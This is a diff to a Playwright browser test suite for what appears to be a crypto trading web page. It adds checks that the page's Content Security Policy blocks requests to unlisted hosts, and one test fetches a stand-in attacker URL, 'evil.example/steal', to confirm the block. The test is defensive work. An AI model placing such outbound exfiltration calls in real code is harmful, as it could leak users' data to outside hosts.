@@ -35,6 +35,7 @@ async function run(name, fn, browser) {
     const page = await browser.newPage({ viewport: { width: 390, height: 800 } });
     const errors = [];
     page.on('pageerror', e => errors.push(e.message));
+    page.on('console', m => { if (/Content Security Policy|violates the following/i.test(m.text())) errors.push('CSP: ' + m.text().slice(0, 200)); });
     try { await fn(page); assert.deepEqual(errors, [], 'page errors'); console.log('ok   ' + name); }
     catch (e) { console.error('FAIL ' + name + ': ' + e.message); process.exitCode = 1; }
     finally { await page.close(); }
@@ -996,6 +997,22 @@ async function run(name, fn, browser) {
         assert.equal(await page.inputValue('#cmSym'), 'ETHUSDT');
     }, browser);
 
+    await run('csp: requests to hosts outside the allowlist are blocked, allowed hosts are not', async page => {
+        await page.route('**/api/v3/**', r => r.abort());
+        await page.goto(PAGE); await page.waitForTimeout(300);
+        page.removeAllListeners('console');                                   // тут порушення очікуване
+        const res = await page.evaluate(() => new Promise(resolve => {
+            const seen = [];
+            document.addEventListener('securitypolicyviolation', e => seen.push(e.violatedDirective + ' ' + e.blockedURI));
+            fetch('https://evil.example/steal').catch(() => {});
+            fetch('https://ozffbhmfyoerdiosbfqq.supabase.co/auth/v1/health').catch(() => {});
+            setTimeout(() => resolve(seen), 400);
+        }));
+        assert.equal(res.length, 1);
+        assert.match(res[0], /^connect-src https:\/\/evil\.example/);
+        assert.equal(await page.evaluate(() => document.querySelector('meta[http-equiv="Content-Security-Policy"]').content.includes("object-src 'none'")), true);
+    }, browser);
+
     await run('TradingView script is not loaded with the page, only on demand', async page => {
         const asked = [];
         page.on('request', r => { if (r.url().includes('tradingview.com')) asked.push(r.url()); });
@@ -1020,6 +1037,7 @@ async function run(name, fn, browser) {
         const [dl] = await Promise.all([page.waitForEvent('download'), page.evaluate(() => window.downloadAppFile())]);
         const out = path.join(require('node:os').tmpdir(), 'cs_bundle_test.html');
         await dl.saveAs(out);
+        assert.equal(fs.readFileSync(out, 'utf8').split('<script')[0].includes('Content-Security-Policy'), false);     // data:-скрипт бібліотеки несумісний із політикою
         const bundle = await browser.newPage();
         const errs = [];
         bundle.on('pageerror', e => errs.push(e.message));
